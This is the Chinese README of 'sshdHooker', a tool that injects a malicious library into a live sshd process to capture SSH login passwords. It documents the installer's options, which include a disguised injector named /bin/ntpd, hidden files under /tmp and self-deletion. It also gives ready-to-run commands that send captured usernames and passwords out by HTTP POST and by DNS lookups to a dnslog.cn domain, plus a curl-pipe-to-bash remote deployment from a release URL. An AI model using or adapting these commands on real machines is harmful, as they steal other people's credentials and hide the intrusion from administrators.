# what's this?

注入SSHD之后就能记录下密码或者做其他操作。


需要关闭selinux

[English](readme.md) | 中文文档

# how to use

## auto installer
一键安装，自动识别 x86_64/aarch64 架构，内嵌全部源码现场编译

直接执行命令
```
bash install.sh
```

直接运行后ssh密码登录，记录地址为/tmp/.password.txt，恶意so地址为/tmp/.g.so，注入器为/bin/ntpd

安装器会自动完成：环境预检（root/glibc/PAM/SELinux/ptrace）-> sshd主进程pid探测（支持systemd）-> 现场编译 -> 启动自检

其他参数（支持 `-x 值` 与 `--long=值` 两种写法）：
```
    -s, --sshd-pid    手动指定要注入的sshd主进程pid，一般会自动探测，探测失败或不准时使用
    -e, --evil-so     修改so文件的路径，默认/tmp/.g.so
    -o, --output      修改注入器的路径，默认/bin/ntpd
    -m, --mode        修改mode，默认0为输出到文件（/tmp/.password.txt），1为命令执行模式
    -p, --payload     修改payload，默认/tmp/.password.txt；mode=1时作为命令模板，需包含两个%s（格式化用户名和密码）
    -d, --delete      自动删除，设置为anyone则抓到任意密码后立刻删除，否则抓到指定用户名的密码后删除
    -l, --libc        指定/proc/pid/maps中libc的匹配串，默认自动匹配libc-xxxx.so和libc.so.x，特殊libc名称时可手动指定
        --status      查看注入器运行状态
        --uninstall   停止注入器并清理所有文件
        --keep-build  保留编译临时目录（调试用）
    -h, --help        帮助
```

注意：payload中的特殊字符（如`&`）无需任何转义。

## 例子

http发送密码
```
bash install.sh -p "curl -X POST -d 'username=%s&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1
```

dns发送密码并且自动删除（请确保你的命令是不堵塞的，因为本程序的实现用的是system是单线程，命令如果堵塞将会导致ssh登录线程一并堵塞）
```
bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
```

远程快速自动部署并自动删除
```
curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -d anyone
```

远程快速自动部署并通过http发送密码后并自动删除 (*推荐*)
```
curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -p "curl -X POST -d 'username=%s&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1 -d anyone
```

安装后的管理
```
bash install.sh --status      # 查看注入器状态与日志
bash install.sh --uninstall   # 停止注入器并清理所有文件
```

## 兼容性

- 实测可用：Debian 12/13、Ubuntu 22.04/24.04、Rocky/RHEL/CentOS 8/9（aarch64 容器与 x86_64 真机，含 OpenSSH 8.0 ~ 10.0）
- 环境要求：glibc、sshd 启用 PAM（pam_unix 密码认证）、SELinux 非 enforcing、root 权限、目标机装有 gcc
- 不适用：musl（Alpine 等 sshd 无 PAM 的环境）、仅公钥认证、认证栈不含 pam_unix 的场景

## 从源码重新生成安装器

安装器由仓库源码打包生成（源码目录 `x86_64/`、`arm/` 是唯一权威，勿直接改 `install.sh`）：
```
tools/mkinstaller.sh
```

## debug

执行
```

gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99

mv test2.so /tmp/hello.so

gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```

然后等待用户连接SSH并且登录成功，密码保存于/tmp/.password.txt

# todo

 - 增加x86/arm支持
 - bypass SELINUX
